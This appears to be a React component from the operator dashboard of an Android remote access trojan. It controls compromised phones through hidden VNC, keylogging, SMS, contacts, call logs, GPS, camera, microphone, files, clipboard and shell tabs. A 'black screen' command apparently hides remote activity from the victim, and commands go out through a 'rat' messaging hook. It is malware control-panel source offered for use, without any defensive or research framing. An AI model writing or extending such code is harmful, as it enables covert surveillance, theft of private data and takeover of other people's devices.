import { useState, useEffect, useCallback } from 'react';
import HvncView from './HvncView';
import InfoTab from './tabs/InfoTab';
import SmsTab from './tabs/SmsTab';
import ContactsTab from './tabs/ContactsTab';
import CallLogsTab from './tabs/CallLogsTab';
import LocationTab from './tabs/LocationTab';
import CameraTab from './tabs/CameraTab';
import AudioTab from './tabs/AudioTab';
import FilesTab from './tabs/FilesTab';
import AppsTab from './tabs/AppsTab';
import KeylogTab from './tabs/KeylogTab';
import ShellTab from './tabs/ShellTab';
import ClipboardTab from './tabs/ClipboardTab';
import NotifTab from './tabs/NotifTab';

// Tab definitions
const TABS = [
  { id: 'hvnc',     label: 'HVNC',    icon: '◈' },
  { id: 'info',     label: 'Info',     icon: 'ℹ' },
  { id: 'keylog',   label: 'Keylog',   icon: '⌨' },
  { id: 'sms',      label: 'SMS',      icon: '✉' },
  { id: 'notif',    label: 'Notif',    icon: '🔔' },
  { id: 'contacts', label: 'Contacts', icon: '👤' },
  { id: 'calls',    label: 'Calls',    icon: '☎' },
  { id: 'location', label: 'GPS',      icon: '⌖' },
  { id: 'camera',   label: 'Cam',      icon: '⬡' },
  { id: 'audio',    label: 'Mic',      icon: '◉' },
  { id: 'files',    label: 'Files',    icon: '▦' },
  { id: 'apps',     label: 'Apps',     icon: '◫' },
  { id: 'clip',     label: 'Clip',     icon: '▣' },
  { id: 'shell',    label: 'Shell',    icon: '$' },
];

// Device-level data store (populated by socket messages)
const deviceData = {};

export default function DevicePanel({ device, hvncHandlerRef, onSidebarOpen }) {
  const [tab,       setTab]       = useState('hvnc');
  const [tabData,   setTabData]   = useState({});

  // Listen for messages from App.jsx for this device
  useEffect(() => {
    const handler = (e) => {
      const { deviceId, msg } = e.detail;
      if (deviceId !== device.id) return;
      setTabData(prev => ({
        ...prev,
        [msg.type || 'unknown']: msg,
      }));
    };
    window.addEventListener('rat_msg', handler);
    return () => window.removeEventListener('rat_msg', handler);
  }, [device.id]);

  const send = useCallback((cmd) => {
    if (window.__ratSend) window.__ratSend(device.id, typeof cmd === 'string' ? { type: cmd } : cmd);
  }, [device.id]);

  const isHvnc = tab === 'hvnc';

  return (
    <div style={S.root}>

      {/* Device header bar */}
      <div style={S.header}>
        <button onClick={onSidebarOpen} style={S.menuBtn} title="Devices">☰</button>

        <div style={S.dot(device.online)} />

        <div style={S.headerInfo}>
          <span style={S.deviceName}>
            {device.alias || device.model || device.id.slice(0, 14)}
          </span>
          <span style={S.deviceSub}>
            {[device.manufacturer, device.android_version && `Android ${device.android_version}`, device.ip].filter(Boolean).join(' · ')}
          </span>
        </div>

        {/* Status badges */}
        <div style={S.badges}>
          {device.accessibility && <Badge label="A11Y" color="#00d26a" />}
          {device.vnc?.active    && <Badge label="VNC"  color="#7b61ff" />}
          {device.battery_level >= 0 && (
            <Badge
              label={`⚡${device.battery_level}%`}
              color={device.battery_level < 20 ? '#f44' : '#00d26a'}
            />
          )}
        </div>

        {/* Quick command bar */}
        <div style={S.quickBar}>
          <QuickBtn onClick={() => send('RECONNECT_CONNECTION')} title="Reconnect">↻</QuickBtn>
          <QuickBtn onClick={() => send('WAKEUP')} title="Wake screen">⏻</QuickBtn>
          <QuickBtn onClick={() => send('HOME')} title="Home">⌂</QuickBtn>
          <QuickBtn onClick={() => send('BLACK_SCREEN_ON')} title="Black screen on">■</QuickBtn>
          <QuickBtn onClick={() => send('BLACK_SCREEN_OFF')} title="Black screen off">□</QuickBtn>
        </div>
      </div>

      {/* Tab strip */}
      <div style={S.tabStrip}>
        {TABS.map(t => (
          <button key={t.id} onClick={() => setTab(t.id)} style={S.tab(tab === t.id)}>
            <span style={{ fontSize: 13, lineHeight: 1 }}>{t.icon}</span>
            <span style={S.tabLabel}>{t.label}</span>
          </button>
        ))}
      </div>

      {/* Content */}
      <div style={{ flex: 1, overflow: isHvnc ? 'hidden' : 'auto', display: 'flex', flexDirection: 'column' }}>
        {tab === 'hvnc' && (
          <HvncView device={device} hvncHandlerRef={hvncHandlerRef} />
        )}
        {tab !== 'hvnc' && (
          <div style={S.tabContent}>
            {tab === 'info'      && <InfoTab     device={device} data={tabData} send={send} />}
            {tab === 'keylog'    && <KeylogTab   device={device} data={tabData} send={send} />}
            {tab === 'sms'       && <SmsTab      device={device} data={tabData} send={send} />}
            {tab === 'notif'     && <NotifTab    device={device} data={tabData} send={send} />}
            {tab === 'contacts'  && <ContactsTab device={device} data={tabData} send={send} />}
            {tab === 'calls'     && <CallLogsTab device={device} data={tabData} send={send} />}
            {tab === 'location'  && <LocationTab device={device} data={tabData} send={send} />}
            {tab === 'camera'    && <CameraTab   device={device} data={tabData} send={send} hvncHandlerRef={hvncHandlerRef} />}
            {tab === 'audio'     && <AudioTab    device={device} data={tabData} send={send} />}
            {tab === 'files'     && <FilesTab    device={device} data={tabData} send={send} />}
            {tab === 'apps'      && <AppsTab     device={device} data={tabData} send={send} />}
            {tab === 'clip'      && <ClipboardTab device={device} data={tabData} send={send} />}
            {tab === 'shell'     && <ShellTab    device={device} data={tabData} send={send} />}
          </div>
        )}
      </div>
    </div>
  );
}

// ── Sub-components ─────────────────────────────────────────────────────────────

function Badge({ label, color }) {
  return (
    <span style={{
      background: color + '18',
      border: `1px solid ${color}44`,
      color,
      fontSize: 9,
      padding: '2px 6px',
      borderRadius: 3,
      fontFamily: 'monospace',
      letterSpacing: .5,
      flexShrink: 0,
    }}>
      {label}
    </span>
  );
}

function QuickBtn({ onClick, title, children }) {
  return (
    <button
      onClick={onClick}
      title={title}
      style={{
        background: 'none',
        border: '1px solid #1e1e2a',
        borderRadius: 3,
        color: '#555',
        fontSize: 13,
        width: 26, height: 26,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        cursor: 'pointer',
        flexShrink: 0,
        transition: 'color .12s, border-color .12s',
        padding: 0,
      }}
      onMouseOver={e => { e.currentTarget.style.color = '#aaa'; e.currentTarget.style.borderColor = '#444'; }}
      onMouseOut={e  => { e.currentTarget.style.color = '#555'; e.currentTarget.style.borderColor = '#1e1e2a'; }}
    >
      {children}
    </button>
  );
}

// ── Styles ─────────────────────────────────────────────────────────────────────

const S = {
  root: {
    flex: 1,
    display: 'flex',
    flexDirection: 'column',
    overflow: 'hidden',
    minWidth: 0,
    background: '#080810',
  },
  header: {
    display: 'flex',
    alignItems: 'center',
    gap: 8,
    padding: '6px 12px',
    background: '#0a0a14',
    borderBottom: '1px solid #1a1a24',
    flexShrink: 0,
    flexWrap: 'wrap',
    minHeight: 46,
  },
  menuBtn: {
    background: 'none',
    border: 'none',
    color: '#444',
    fontSize: 18,
    cursor: 'pointer',
    flexShrink: 0,
    lineHeight: 1,
    padding: 0,
  },
  dot: (online) => ({
    width: 8, height: 8,
    borderRadius: '50%',
    background: online ? '#00d26a' : '#2a2a3a',
    boxShadow: online ? '0 0 5px #00d26a88' : 'none',
    flexShrink: 0,
  }),
  headerInfo: {
    display: 'flex',
    flexDirection: 'column',
    minWidth: 0,
    flex: 1,
  },
  deviceName: {
    fontSize: 13,
    fontWeight: 700,
    color: '#ddd',
    overflow: 'hidden',
    textOverflow: 'ellipsis',
    whiteSpace: 'nowrap',
  },
  deviceSub: {
    fontSize: 10,
    color: '#444',
    overflow: 'hidden',
    textOverflow: 'ellipsis',
    whiteSpace: 'nowrap',
    marginTop: 1,
  },
  badges: {
    display: 'flex',
    gap: 5,
    alignItems: 'center',
    flexWrap: 'wrap',
    flexShrink: 0,
  },
  quickBar: {
    display: 'flex',
    gap: 4,
    alignItems: 'center',
    flexShrink: 0,
  },
  tabStrip: {
    display: 'flex',
    overflowX: 'auto',
    background: '#09091a',
    borderBottom: '1px solid #1a1a24',
    flexShrink: 0,
    scrollbarWidth: 'none',
  },
  tab: (active) => ({
    display: 'flex',
    alignItems: 'center',
    gap: 5,
    padding: '8px 12px',
    background: 'none',
    border: 'none',
    borderBottom: active ? '2px solid #00d26a' : '2px solid transparent',
    color: active ? '#00d26a' : '#444',
    fontSize: 11,
    cursor: 'pointer',
    whiteSpace: 'nowrap',
    transition: 'color .12s, border-color .12s',
    fontFamily: 'inherit',
    letterSpacing: .5,
    flexShrink: 0,
  }),
  tabLabel: {
    fontWeight: 600,
  },
  tabContent: {
    flex: 1,
    padding: 16,
  },
};
